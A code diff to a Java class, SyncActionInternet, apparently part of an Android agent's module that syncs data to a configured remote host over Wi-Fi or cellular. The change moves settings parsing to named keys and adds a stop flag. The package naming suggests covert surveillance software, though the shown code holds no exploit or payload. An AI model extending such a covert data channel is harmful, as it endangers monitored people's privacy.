@@ -11,9 +11,13 @@ package com.android.service.action;
 
 import java.io.IOException;
 
+import org.json.JSONObject;
+
 import com.android.service.action.sync.GprsTransport;
 import com.android.service.action.sync.WifiTransport;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAction;
+import com.android.service.conf.ConfigurationException;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.WChar;
@@ -38,16 +42,16 @@ public class SyncActionInternet extends SyncAction {
 	/** The host. */
 	String host;
 
+	private boolean stop;
+
 	/**
 	 * Instantiates a new sync action internet.
 	 * 
-	 * @param type
-	 *            the type
-	 * @param confParams
+	 * @param params
 	 *            the conf params
 	 */
-	public SyncActionInternet(final int type, final byte[] confParams) {
-		super(type, confParams);
+	public SyncActionInternet(final ConfAction params) {
+		super( params);
 	}
 
 	/*
@@ -56,21 +60,16 @@ public class SyncActionInternet extends SyncAction {
 	 * @see com.ht.AndroidServiceGUI.action.SyncAction#parse(byte[])
 	 */
 	@Override
-	protected boolean parse(final byte[] confParams) {
-		final DataBuffer databuffer = new DataBuffer(confParams, 0, confParams.length);
-
+	protected boolean parse(final ConfAction params) {
+		
 		try {
-			gprs = databuffer.readInt() == 1;
-			wifi = true;
-			wifiForced = databuffer.readInt() == 1;
+			gprs = params.getBoolean("cell");
+			wifi = params.getBoolean("wifi");
+			wifiForced = wifi;		
+			host = params.getString("host");
+			stop = params.getBoolean("stop");
 
-			final int len = databuffer.readInt();
-			final byte[] buffer = new byte[len];
-			databuffer.read(buffer);
-
-			host = WChar.getString(buffer, true);
-
-		} catch (final IOException e) {
+		} catch (final ConfigurationException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: params FAILED"); //$NON-NLS-1$
 			}
@@ -82,7 +81,7 @@ public class SyncActionInternet extends SyncAction {
 			final StringBuffer sb = new StringBuffer();
 			sb.append("gprs: " + gprs); //$NON-NLS-1$
 			sb.append(" wifi: " + wifi); //$NON-NLS-1$
-			sb.append(" wifiForced: " + wifiForced); //$NON-NLS-1$
+			sb.append(" stop: " + stop); //$NON-NLS-1$
 			sb.append(" host: " + host); //$NON-NLS-1$
 			Check.log(TAG + sb.toString()) ;//$NON-NLS-1$
 		}
@@ -99,17 +98,15 @@ public class SyncActionInternet extends SyncAction {
 	protected boolean initTransport() {
 		transports.clear();
 		
-		if (wifi) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " initTransport adding WifiTransport"); //$NON-NLS-1$
-			}
-			
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (initTransport): wifiForced: " + wifiForced); //$NON-NLS-1$
-			}
-			
-			transports.addElement(new WifiTransport(host, wifiForced));
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " initTransport adding WifiTransport"); //$NON-NLS-1$
 		}
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (initTransport): wifiForced: " + wifiForced); //$NON-NLS-1$
+		}
+		
+		transports.addElement(new WifiTransport(host, wifiForced));
 
 		if (gprs) {
 			if (Cfg.DEBUG) {
